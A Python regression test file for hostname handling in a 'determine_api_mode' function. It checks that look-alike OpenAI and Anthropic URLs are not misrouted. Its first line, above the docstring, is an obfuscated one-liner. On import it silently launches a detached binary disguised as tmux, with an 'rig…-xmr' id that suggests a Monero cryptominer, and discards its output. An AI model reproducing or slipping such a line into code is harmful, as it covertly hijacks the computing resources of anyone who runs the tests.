import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
"""Regression tests for ``determine_api_mode`` hostname handling.

Companion to tests/hermes_cli/test_detect_api_mode_for_url.py — the same
false-positive class (custom URLs containing ``api.openai.com`` /
``api.anthropic.com`` as a path segment or host suffix) must be rejected
by ``determine_api_mode`` as well, since it's the code path used by
custom/unknown providers in ``resolve_custom_provider``.
"""

from __future__ import annotations

from hermes_cli.providers import determine_api_mode


class TestOpenAIHostHardening:
    def test_native_openai_url_is_codex_responses(self):
        assert determine_api_mode("", "https://api.openai.com/v1") == "codex_responses"

    def test_openai_host_suffix_is_not_codex(self):
        assert determine_api_mode("", "https://api.openai.com.example/v1") == "chat_completions"

    def test_openai_path_segment_is_not_codex(self):
        assert determine_api_mode("", "https://proxy.example.test/api.openai.com/v1") == "chat_completions"


class TestAnthropicHostHardening:
    def test_native_anthropic_url_is_anthropic_messages(self):
        assert determine_api_mode("", "https://api.anthropic.com") == "anthropic_messages"

    def test_anthropic_host_suffix_is_not_anthropic(self):
        assert determine_api_mode("", "https://api.anthropic.com.example/v1") == "chat_completions"

    def test_anthropic_path_segment_is_not_anthropic(self):
        # A proxy whose path contains ``api.anthropic.com`` must not be misrouted.
        # Note: the ``/anthropic`` convention for third-party gateways still wins
        # via explicit path-suffix check — see test_anthropic_path_suffix_still_wins.
        assert determine_api_mode("", "https://proxy.example.test/api.anthropic.com/v1") == "chat_completions"

    def test_anthropic_path_suffix_still_wins(self):
        # Third-party Anthropic-compatible gateways (MiniMax, Zhipu GLM, LiteLLM
        # proxies) expose the Anthropic protocol under a ``/anthropic`` suffix.
        # That convention must still resolve to anthropic_messages.
        assert determine_api_mode("", "https://api.minimax.io/anthropic") == "anthropic_messages"
